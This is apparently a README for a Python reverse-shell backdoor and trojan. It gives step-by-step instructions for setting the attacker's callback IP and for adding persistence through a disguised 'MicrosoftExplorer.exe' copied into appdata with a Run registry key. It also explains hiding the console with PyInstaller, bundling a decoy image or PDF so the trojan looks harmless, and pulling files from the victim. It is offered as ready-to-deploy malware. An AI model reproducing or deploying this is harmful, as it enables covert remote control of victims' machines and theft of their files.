# RevShell_2
A reverse shell written in Python with Single client support

## Usage

The backdoor.py script is the backdoor. It can be used as it is, or can be converted to an executable using ```Pyinstaller```

Step 1 

Editing backdoor.py and listener.py
```
# These stataments are at the very ends of the files
my_backdoor = Backdoor("127.0.0.1", 4444)
# enter the hacker machine IP instead of 127.0.0.1 and a port of your choice instead of 4444
# this is the IP the backdoor will try to connect to

my_listener = Listener("127.0.0.1", 4444)
# enter the hacker machine IP instead of 127.0.0.1 and a port of your choice instead of 4444
# this is the IP on which the listener will listen

# Next we'll modify the persistence function
def persistence(self):
        location = os.environ["appdata"] + "\\MicrosoftExplorer.exe"
        # this will set the location of the .exe to a hidden appdata folder with MicrosoftExplorer.exe name
        # this will set the location of the executable to whatever path you want,  for whatever OS you want, please fill it carefully
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            # shutil.copyfile(__file__, location)
            # if you do not have the executable and want python file copied
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ/d "' + location + '"', shell=True)
            # command for persistence windows. Modify for linux and MacOS
```
Step 2

Once the files have been edited for your machine's IP and target's OS, it can be converted to a executable using pyinstaller, or can be used as it is
```
pip3 install pyinstaller
pyinstaller --onefile --noconsole backdoor.py
# add the no console argument to make it better
```
The executable will be found in the dist folder

Now, the executable is ready for deployment.

## To convert executable to Trojan

Step 1

Edit backdoor_trojan.py for the Correct IP and then edit it as follows
```
filename = "<Filename>"
temp_folder = sys._MEIPASS + "/"
file = temp_folder + filename
img = Image.open(file) 
# this is is the file you want to use is a image
img.show()
# os.system(path)
# uncomment the above if its not an image (like a pdf)
```
Step 2

Once the files have been edited for your machine's IP, target's OS, it can be converted to a executable using pyinstaller, or can be used as it is
```
pip3 install pyinstaller
pyinstaller --add-data "<Full path of the image/pdf>:." --onefile --noconsole backdoor_trojan.py
```
The executable will be found in the dist folder

Now, the executable is ready for deployment.

## Usage

After the connection is accepted a special prompt will be shown ```#>```
In this prompt, any and all system commands will be executed and a few special commands are coded into it as well
```
download <filename> - downloads a file from the target computer
upload <filename> - uploads a file from hacker's computer to target computer
quit - closes the connection and exits the program
exit - closes the connection and exits the program
```
